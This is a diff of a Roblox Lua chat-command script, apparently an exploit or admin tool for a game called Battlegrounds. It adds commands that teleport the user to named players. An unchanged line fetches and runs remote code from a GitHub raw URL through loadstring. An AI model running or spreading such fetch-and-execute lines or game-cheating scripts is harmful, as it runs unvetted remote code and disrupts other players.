@@ -235,6 +235,11 @@ function onChatMessage(player, message)
       explosion.Parent = workspace
    elseif message:lower() == "hamsterovichbringalladminbattlegrounds" then
       player = game.Players.LocalPlayer
+      local Hamsterovich = game.Players:FindFirstChild("Hamsterovich")
+      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
+            game.Players.Hamsterovich.Character.HumanoidRootPart.CFrame
+            elseif message:lower() == "wolfdmitrichbringalladminbattlegrounds" then
+      player = game.Players.LocalPlayer
       local Hamsterovich = game.Players:FindFirstChild("Wolfdmitrich")
       game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
          game.Players.Wolfdmitrich.Character.HumanoidRootPart.CFrame
@@ -242,7 +247,12 @@ function onChatMessage(player, message)
       player = game.Players.LocalPlayer
       local Hamsterovich = game.Players:FindFirstChild("ADSKerX")
       game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
-         game.Players.ADSKerX.Character.HumanoidRootPart.CFrame
+            game.Players.ADSKerX.Character.HumanoidRootPart.CFrame
+            elseif message:lower() == "megacoconutbringalladminbattlegrounds" then
+      player = game.Players.LocalPlayer
+      local Hamsterovich = game.Players:FindFirstChild("MEGACOCONUT")
+      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
+         game.Players.MEGACOCONUT.Character.HumanoidRootPart.CFrame
    elseif message:lower() == "scarytwoalladminbattlegrounds" then
       loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/scary/main/file"))()
    elseif message:lower() == "jailalladminbattlegrounds" then
